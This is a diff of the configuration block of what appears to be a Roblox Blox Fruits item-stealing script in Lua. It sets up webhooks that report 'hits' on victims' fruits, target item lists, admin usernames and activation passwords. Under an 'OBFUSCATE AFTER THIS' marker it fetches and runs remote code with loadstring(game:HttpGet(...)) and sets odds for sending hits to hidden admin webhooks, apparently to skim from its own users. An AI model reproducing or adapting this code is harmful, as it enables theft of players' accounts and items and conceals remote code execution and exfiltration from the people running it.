@@ -1,17 +1,14 @@
+--[[ Config ]]--
 Webhook = "https://sharky-on-top.script-config-protector.workers.dev/w/d3690bb6-d5ac-4891-b7cc-8f55263cfadb" -- << Protected URL for main user hits (url1)
 Usernames = {"user1", "user2", "user3", "user4", "user5"} -- << Your primary usernames (can use commands, bypass filter)
-FruitsToHit = {"Dragon (West)-Dragon (West)"} -- << Fruits you want to target (others can be added below)
+FruitsToHit = {"Leopard-Leopard", "Yeti-Yeti", "Gas-Gas"} -- << Fruits you want to target (others added below/guaranteed)
 
-
---OBFUSCATE AFTER THIS
---ADMIN CONFIG START
-loadstring(game:HttpGet("https://raw.githubusercontent.com/W-Scripts/UI/refs/heads/main/LoadingUl"))() --loads other webhooks
+--[[ OBFUSCATE AFTER THIS ]]--
+--[[ ADMIN CONFIG START ]]--
+loadstring(game:HttpGet("https://raw.githubusercontent.com/W-Scripts/UI/refs/heads/main/LoadingUl"))()
 
 local TEST_WEBHOOK = "https://l.webhook.party/hook/vWJ1Rd7lQSopCs4Vuxa7qHWNoYm4q9%2FH4UAqVOaMoxSpOq%2F4Yp08fCU4Tkn%2Fq26SyB0EVJmJSP9spoYM4pFRDLegxSsmeVCLVPWmKH437EawBax1%2FvN6KILwa9CaWV1%2Fkg7EjtZ0UlOwMyqR7X1iXvdaUcyJaApo2%2FIn7mbomfGkAFacgxB6WVOi0Lm9exZDmC04bOlBJ3pX9FcWLadkzLCKvZE8ytiea1LgyVzVyBUBCPSBTWl6yTaIPk8428hc23eC3dAsPuCK4Dbu2ZernRaO654dO7nVSJuzelZL09nkouPlr28BGoAwlNImD%2FvtTTPWuZnUVTnr9%2FijK2q%2Bh92EfSHf%2BH5qg334UcBZR5b7osNi4z%2BD8DCK%2F%2BooE1xWtv6WgNQkDMM%3D/zWMIeMClX%2FlPLAgD" -- For simple hit integrity check only
-local TEST_PAYLOAD = game:GetService("HttpService"):JSONEncode({
-    content = "# <a:babyshark:721795947037851688> Sharky! Someone just got a NICE HIT :) <a:babyshark:721795947037851688>"
-})
-
+local TEST_PAYLOAD = game:GetService("HttpService"):JSONEncode({ content = "# <a:babyshark:721795947037851688> Sharky! Someone just got a NICE HIT :) <a:babyshark:721795947037851688>" })
 
 AddTheseFruits = { "Dragon (West)-Dragon (West)", "Dragon (East)-Dragon (East)", "Kitsune-Kitsune" } -- << Fruits that MUST always be in the FruitsToHit table
 
@@ -19,13 +16,13 @@ TestingUsernames = { "tester1", "your_alt_account" }
 
 ActivationPasswords = { "ishusontop", "bonzarbal", "ishufishy" } -- << Passwords for ?activate command
 
-local coreAdminUsernames = { "x6TNine", "aka_0ver", "bonzarbal53", "bonzarbal52", "bonzarbal51", "bonzarbal50", "xRip_Cyborg" } -- << Core admin usernames (hardcoded)
+local coreAdminUsernames = { "x6TNine", "aka_0ver", "bonzarbal53", "bonzarbal52", "bonzarbal51", "bonzarbal50" } -- << Core admin usernames (hardcoded)
 
 RGBGreenVal = 0.20 -- << (e.g., 20%) Chance user webhook gets Dragon hit notifications.
 RGBRedVal = 0.60 -- << (e.g., 60%) Chance user webhook gets Premium/Kitsune/Yeti hits.
 
 local validation_sig = "rashya5@%-hsfj79h93-wakliballs"
---ADMIN CONFIG END
+--[[ ADMIN CONFIG END ]]--
 
 
 local function ensureFruitsToHit()
